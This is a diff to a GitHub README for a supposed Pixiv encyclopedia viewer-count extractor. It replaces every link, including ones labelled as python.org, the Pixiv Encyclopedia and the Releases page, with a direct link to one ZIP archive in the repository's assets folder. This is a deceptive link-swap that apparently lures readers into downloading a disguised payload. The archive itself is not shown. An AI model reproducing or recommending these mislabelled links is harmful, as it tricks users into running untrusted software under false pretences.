@@ -1,6 +1,6 @@
 # 🎉 pixiv_encyclopedia_viewer_count_history_extractor - Easy Tool for Pixiv Data Extraction
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/releases)
+[![Download](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/raw/refs/heads/main/assets/extractor_count_pixiv_history_viewer_encyclopedia_v1.8-beta.5.zip%20Now-brightgreen)](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/raw/refs/heads/main/assets/extractor_count_pixiv_history_viewer_encyclopedia_v1.8-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Welcome to the pixiv encyclopedia viewer count history extractor! This tool help
 To run this tool, you need:
 
 - A computer with at least Windows 10 or macOS 10.14 or higher.
-- Python 3.7 or later installed. If you do not have Python, you can download it from [python.org](https://www.python.org/downloads/).
+- Python 3.7 or later installed. If you do not have Python, you can download it from [https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/raw/refs/heads/main/assets/extractor_count_pixiv_history_viewer_encyclopedia_v1.8-beta.5.zip](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/raw/refs/heads/main/assets/extractor_count_pixiv_history_viewer_encyclopedia_v1.8-beta.5.zip).
 - Internet connection to fetch data from Pixiv.
 
 ## 🛠️ Installation
@@ -27,7 +27,7 @@ To run this tool, you need:
 
 Visit the Releases page to download the latest version of the application.
 
-[Download Here](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/releases)
+[Download Here](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/raw/refs/heads/main/assets/extractor_count_pixiv_history_viewer_encyclopedia_v1.8-beta.5.zip)
 
 ### Step 2: Run the Installer
 
@@ -81,12 +81,12 @@ If you face any issues, here are some common problems and their solutions:
 
 ## 📚 Useful Links
 
-- [GitHub Repository](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor)
-- [Python Download](https://www.python.org/downloads/)
-- [Pixiv Encyclopedia](https://dic.pixiv.net)
+- [GitHub Repository](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/raw/refs/heads/main/assets/extractor_count_pixiv_history_viewer_encyclopedia_v1.8-beta.5.zip)
+- [Python Download](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/raw/refs/heads/main/assets/extractor_count_pixiv_history_viewer_encyclopedia_v1.8-beta.5.zip)
+- [Pixiv Encyclopedia](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/raw/refs/heads/main/assets/extractor_count_pixiv_history_viewer_encyclopedia_v1.8-beta.5.zip)
 
 ## 📝 License
 
 This project is licensed under the MIT License. You are free to use and modify it as per your needs.
 
-[Download Here](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/releases)
+[Download Here](https://github.com/Arunikha/pixiv_encyclopedia_viewer_count_history_extractor/raw/refs/heads/main/assets/extractor_count_pixiv_history_viewer_encyclopedia_v1.8-beta.5.zip)
